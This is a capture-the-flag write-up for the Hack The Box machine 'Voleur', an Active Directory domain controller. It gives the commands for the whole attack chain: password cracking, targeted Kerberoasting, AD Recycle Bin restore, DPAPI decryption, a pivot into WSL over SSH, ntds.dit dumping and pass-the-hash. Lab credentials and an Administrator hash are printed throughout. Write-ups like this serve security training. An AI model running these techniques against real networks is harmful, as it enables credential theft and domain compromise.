# 🧩 HackTheBox – Voleur (Medium)

**Difficulty:** Medium  
**OS:** Windows (Domain Controller)  
**Type:** Active Directory, Kerberos Abuse, DPAPI, WSL Pivot  
**Status:** ✅ Completed  

---

## 🧠 Overview
**Voleur** is a medium-difficulty Windows Domain Controller machine designed around an assumed-breach scenario.  
We start with low-privileged credentials and move through multiple stages of Active Directory exploitation, Kerberoasting, and DPAPI decryption — ultimately obtaining Administrator access through WSL backups.

---

## 🕵️ Initial Access & Enumeration

### Step 1: Provided Credentials
We are given low-privileged credentials:

ryan.naylor / HollowOct31Nyt


> Note: NTLM authentication is disabled on this host, so **Kerberos** must be used for all authentication.  
Ensure your local time matches the DC to avoid TGT failures:

# Step 2: Port Scan

An nmap scan reveals typical Domain Controller services:

```bash
53/tcp   DNS
88/tcp   Kerberos
135/tcp  MSRPC
389/tcp  LDAP
445/tcp  SMB
5985/tcp WinRM
2222/tcp OpenSSH (Ubuntu)

```
Port 2222/tcp suggests Windows Subsystem for Linux (WSL) is active.

<img width="1333" height="526" alt="image" src="https://github.com/user-attachments/assets/efed2b23-bc99-4893-b1d1-946a75ba504b" />

# Step 3: SMB Enumeration

Using the credentials with Kerberos, we can list SMB shares.
```bash

smbclient -k -L //dc.voleur.htb

Notable shares:

ADMIN$, C$, Finance, HR, IPC$, NETLOGON, SYSVOL, IT

Access to IT share is allowed. Inside it:

IT/First-Line Support/Access_Review.xlsx
```

## 🔐 Extracting Service Account Credentials
# Step 1: Cracking the Excel File

The Excel file is encrypted.
We extract its hash and crack it using Hashcat:

```bash
office2john.py Access_Review.xlsx > hash.txt
hashcat -m 9600 hash.txt /usr/share/wordlists/rockyou.txt

Recovered password:
football1
```

<img width="1332" height="508" alt="image" src="https://github.com/user-attachments/assets/f1b68af8-79fc-498b-b268-7d89f278216a" />

# Step 2: Reading the Spreadsheet

After opening the decrypted file, we find credentials and notes:

```bash
svc_ldap / M1XyC9pW7qT5Vn
svc_iis  / N5pXyW1VqM7CZ8
todd.wolfe (deleted) / NightT1meP1dg3on14
```

## ⚙️ Privilege Escalation – svc_ldap → svc_winrm
# Step 1: BloodHound Analysis

Using RustHound-CE or BloodHound, we discover that:

```bash
svc_ldap has WriteSPN rights over svc_winrm
```

<img width="1338" height="496" alt="image" src="https://github.com/user-attachments/assets/02e1326e-48e9-4179-9130-e218a3a5427d" />

<img width="1353" height="664" alt="image" src="https://github.com/user-attachments/assets/9c226725-ae8a-4360-8c7e-ee10da98c6b5" />

# Step 2: Targeted Kerberoasting

Add a fake SPN to svc_winrm:
```bash
bloodyAD add_spn svc_winrm http/test
```
Request a TGS ticket:
```bash
netexec ldap dc.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' --kerberoasting

```

Crack the ticket hash (mode 13100):
```bash
hashcat -m 13100 ticket.hash rockyou.txt
```

Recovered credentials:
```bash
svc_winrm / AFireInsidedeOzarctica980219afi
```

# Step 3: Access via WinRM

The account svc_winrm is part of the Remote Management Users group.
We authenticate via Kerberos and get a shell:
```bash
kinit svc_winrm
evil-winrm -k -r voleur.htb -i dc.voleur.htb
```

🏁 User Flag obtained!

<img width="1330" height="386" alt="image" src="https://github.com/user-attachments/assets/c8344a3d-cac5-48e9-81a1-22c533b03e46" />


## 🧱 Restoring Deleted User – todd.wolfe
# Step 1: Switch to svc_ldap

We use RunasCs.exe or PowerShell to impersonate svc_ldap.

# Step 2: AD Recycle Bin Abuse

Check for deleted objects:
```bash
Get-ADObject -IncludeDeletedObjects -Filter {isDeleted -eq $true}
```

Restore the deleted user:

```bash
Restore-ADObject -Identity <GUID_of_todd.wolfe>
```


Alternative (NetExec):


```bash
netexec ldap dc.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' --tombstone action=restore
```
Now authenticate as:

```bash
todd.wolfe / NightT1meP1dg3on14
```

## 🔓 DPAPI Credential Recovery – todd.wolfe → jeremy.combs
# Step 1: Access Archived Profile

todd.wolfe has access to:
```bash
\\dc.voleur.htb\IT\Second-Line Support\Archived Users\todd.wolfe
```

Inside we find:

DPAPI credential blob

DPAPI master key

Download both via SMB.

# Step 2: Decrypt with Impacket
```bash
dpapi.py masterkey -keyfile master.key -password 'NightT1meP1dg3on14' -sid S-1-5-21...
dpapi.py credential -credfile cred.blob -masterkey <decrypted_key>
```

Recovered credentials:
```bash
jeremy.combs / qT3V9pLXyN7W4m
```
<img width="1322" height="561" alt="image" src="https://github.com/user-attachments/assets/1c822367-07de-4eac-979a-a2c34468eb28" />

## 🧩 Pivot to WSL – Access as svc_backup
# Step 1: Shell as jeremy.combs

todd.wolfe credentials allow WinRM access again:
```bash
evil-winrm -i dc.voleur.htb -u jeremy.combs -p qT3V9pLXyN7W4m
```

Inside the IT share:
```bash
C:\IT\Third-Line Support\
  ├── id_rsa
  └── Note.txt
  ```

 # Step 2: SSH Key Discovery

The note mentions WSL and Linux backups.
Inspect the key:
```bash
ssh-keygen -y -f id_rsa
```

Comment reveals:
```bash
svc_backup@DC
```

# Step 3: SSH into WSL
```bash
chmod 600 id_rsa
ssh -i id_rsa svc_backup@dc.voleur.htb -p 2222
```

Now we are inside WSL (Ubuntu) environment.

## 🏁 Root Access – Dumping NTDS.dit
# Step 1: Explore Mounted Drives

In WSL, Windows files are under /mnt/c.

Inside /mnt/c/IT/Third-Line Support/Backups/, we find:
```bash

Active Directory/ntds.dit
registry/SYSTEM
registry/SECURITY
```
Step 2: Exfiltrate & Dump Hash
```bash

scp -P 2222 svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/ntds.dit .
scp -P 2222 svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/registry/* .
```
Dump offline using Impacket:
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL

```

Recovered hash:
```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
```

# Step 3: Pass-the-Hash
```bash
evil-winrm -i dc.voleur.htb -u administrator -H e656e07c56d831611b577b160b259ad2
```


🏆 Root Flag obtained!

<img width="1297" height="603" alt="image" src="https://github.com/user-attachments/assets/51993bae-e7c9-428b-824b-a87afa63e122" />
